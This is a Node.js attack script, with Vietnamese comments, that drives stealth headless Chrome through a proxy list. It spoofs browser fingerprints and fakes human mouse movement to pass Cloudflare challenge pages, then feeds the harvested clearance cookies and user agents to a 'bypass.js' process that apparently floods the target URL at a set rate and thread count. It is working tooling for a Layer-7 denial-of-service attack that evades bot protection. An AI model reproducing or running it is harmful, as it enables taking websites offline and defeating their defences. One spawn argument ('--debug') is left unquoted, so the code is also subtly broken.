const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const { spawn } = require("child_process");
const chalk = require('chalk');

puppeteer.use(puppeteerStealth());

if (process.argv.length < 8) {
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const proxies = fs.readFileSync(proxyFile, 'utf8')
  .trim()
  .split(/\r?\n/)
  .filter(p => /^[\w\.-]+:\d+$/.test(p));

const userAgents = [
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
  `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
];

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Màu sắc tùy chỉnh
const colors = {
  green: (text) => chalk.green(text),
  magenta: (text) => chalk.magenta(text)
};

let totalCookies = 0; // Đếm tổng cookie thành công

async function spoofFingerprint(page, userAgent) {
  await page.evaluateOnNewDocument((ua) => {
    Object.defineProperty(navigator, 'userAgent', { value: ua });
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
    Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
    Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
    Object.defineProperty(navigator, 'plugins', { value: [{ name: 'Chrome PDF Plugin' }] });
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
      const originalGetParameter = gl.getParameter;
      gl.getParameter = function(parameter) {
        if (parameter === gl.VENDOR) return 'WebKit';
        if (parameter === gl.RENDERER) return 'Apple GPU';
        return originalGetParameter.call(this, parameter);
      };
    }
  }, userAgent);
}

async function simulateHumanMouseMovement(page, element, options = {}) {
  const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
  const bbox = await element.boundingBox();
  if (!bbox) return;
  const targetX = bbox.x + bbox.width / 2;
  const targetY = bbox.y + bbox.height / 2;
  const { width, height } = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
  let currentX = Math.random() * width;
  let currentY = Math.random() * height;
  const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
  for (let i = 0; i < moves; i++) {
    const progress = i / (moves - 1);
    let nextX = currentX + (targetX - currentX) * progress;
    let nextY = currentY + (targetY - currentY) * progress;
    nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
    nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
    if (Math.random() < overshootChance && i < moves - 1) {
      nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
      nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
    }
    await page.mouse.move(nextX, nextY, { steps: 10 });
    const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
    await sleep(delay);
    if (Math.random() < hesitationChance) {
      await sleep(delay * 3);
    }
    currentX = nextX;
    currentY = nextY;
  }
  await page.mouse.move(targetX, targetY, { steps: 5 });
  await sleep(finalDelay);
}

async function simulateHumanScrolling(page, distance, options = {}) {
  const { minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1 } = options;
  const directionMultiplier = direction === 'up' ? -1 : 1;
  const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
  const baseStepSize = distance / steps;
  let totalScrolled = 0;
  for (let i = 0; i < steps; i++) {
    const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
    let stepSize = Math.round(baseStepSize + jitter);
    if (i === steps - 1) {
      stepSize = (distance - totalScrolled) * directionMultiplier;
    } else {
      stepSize *= directionMultiplier;
    }
    await page.evaluate(scrollAmount => window.scrollBy(0, scrollAmount), stepSize);
    totalScrolled += stepSize * directionMultiplier;
    const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
    await sleep(delay);
    if (Math.random() < pauseChance) {
      await sleep(delay * 6);
    }
  }
}

async function simulateNaturalPageBehavior(page) {
  const { scrollHeight } = await page.evaluate(() => ({ scrollHeight: document.documentElement.scrollHeight }));
  const scrollAmount = Math.floor(scrollHeight * (0.2 + Math.random() * 0.6));
  await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });
  await sleep(1000 + Math.random() * 3000);
  if (Math.random() > 0.5) {
    await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
  }
}

async function retrySolveChallenge(page, proxy) {
  const startTime = Date.now();
  const content = await page.content();
  const title = await page.title();
  if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
    await sleep(Math.random() * 8000 + 4000);
    const cookies = await page.cookies();
    if (cookies.some(c => c.name === "cf_chl_rc_m")) {
      await sleep(5000);
    }
    const captchaBox = await page.$("body > div.main-wrapper > div > div > div > div");
    if (captchaBox) {
      await simulateHumanMouseMovement(page, captchaBox, { minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, jitterFactor: 0.1, overshootChance: 0.4, hesitationChance: 0.3, finalDelay: 700 });
      await captchaBox.click();
      await captchaBox.click({ offset: { x: 17, y: 20.5 } });
      await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
    }
  }
  await sleep(2000);
  return Date.now() - startTime; // Trả về thời gian solve (ms)
}

async function launchBrowser(proxy) {
  const userAgent = randomElement(userAgents);
  const solveStart = Date.now();

  console.log(`${colors.magenta('Js/Browser')} ➝ Start chrome run with addressProxy: ${colors.magenta(proxy)}`);

  const browser = await puppeteer.launch({
    headless: true,
    args: [
      `--proxy-server=${proxy}`,
      `--user-agent=${userAgent}`,
      '--headless=new',
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--no-zygote',
      '--window-size=360,640',
      '--disable-gpu',
      '--disable-accelerated-2d-canvas',
      '--disable-background-timer-throttling',
      '--disable-backgrounding-occluded-windows',
      '--disable-back-forward-cache',
      '--disable-browser-side-navigation',
      '--disable-renderer-backgrounding',
      '--disable-ipc-flooding-protection',
      '--metrics-recording-only',
      '--disable-extensions',
      '--disable-default-apps',
      '--disable-application-cache',
      '--disable-component-extensions-with-background-pages',
      '--disable-client-side-phishing-detection',
      '--disable-popup-blocking',
      '--disable-prompt-on-repost',
      '--disable-infobars',
      '--disable-breakpad',
      '--disable-field-trial-config',
      '--disable-background-networking',
      '--disable-search-engine-choice-screen',
      '--ignore-certificate-errors',
      '--ignore-ssl-errors',
      '--tls-min-version=1.2',
      '--tls-max-version=1.3',
      '--ssl-version-min=tls1.2',
      '--ssl-version-max=tls1.3',
      '--enable-quic',
      '--enable-features=PostQuantumKyber',
      '--disable-blink-features=AutomationControlled',
      '--no-first-run',
      '--test-type',
      '--allow-pre-commit-input',
      '--force-color-profile=srgb',
      '--use-mock-keychain',
      '--enable-features=NetworkService,NetworkServiceInProcess',
      '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
    ],
    defaultViewport: { width: 360, height: 640, deviceScaleFactor: 3, isMobile: true, hasTouch: Math.random() < 0.5, isLandscape: false }
  });

  const page = (await browser.pages())[0];
  await spoofFingerprint(page, userAgent);

  page.setDefaultNavigationTimeout(60000);
  await page.goto(targetURL, { waitUntil: "domcontentloaded" });
  await simulateNaturalPageBehavior(page);

  let attempts = 0;
  const maxAttempts = 4;
  let solveTime = 0;
  while (attempts < maxAttempts) {
    solveTime = await retrySolveChallenge(page, proxy);
    const cookies = await page.cookies(targetURL);
    const shortCookies = cookies.filter(c => c.value.length < 15);
    if (shortCookies.length === 0) {
      const pageTitle = await page.title();
      const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
      totalCookies++;

      console.log(`{`);
      console.log(`   ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(pageTitle)}`);
      console.log(`   ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(proxy)}`);
      console.log(`   ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(userAgent)}`);
      console.log(`   ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(cookieString)}`);
      console.log(`   ${chalk.black.bold.bgWhite('Time_Solver')}: ${colors.green(`${(solveTime / 1000).toFixed(2)}s`)}`);
      console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(totalCookies)}`);
      console.log(`},`);

      await browser.close();
      return { cookies: cookieString, proxy, userAgent };
    }
    attempts++;
  }
  await browser.close();
  return null;
}

async function worker(task, done) {
  try {
    const result = await launchBrowser(task.proxy);
    if (result) {
      spawn("node", ["bypass.js", "GET", targetURL, duration, thread, rates, result.proxy, result.cookies, result.userAgent, --debug]);
    }
  } catch (e) {}
  done();
}

const queue = async.queue(worker, threads);

proxies.forEach(proxy => queue.push({ proxy }));

queue.drain(() => process.exit(0));

setTimeout(() => {
  queue.kill();
  require('child_process').exec('pkill -f bypass');
  require('child_process').exec('pkill -f chrome');
  setTimeout(() => process.exit(0), 5000);
}, duration * 1000);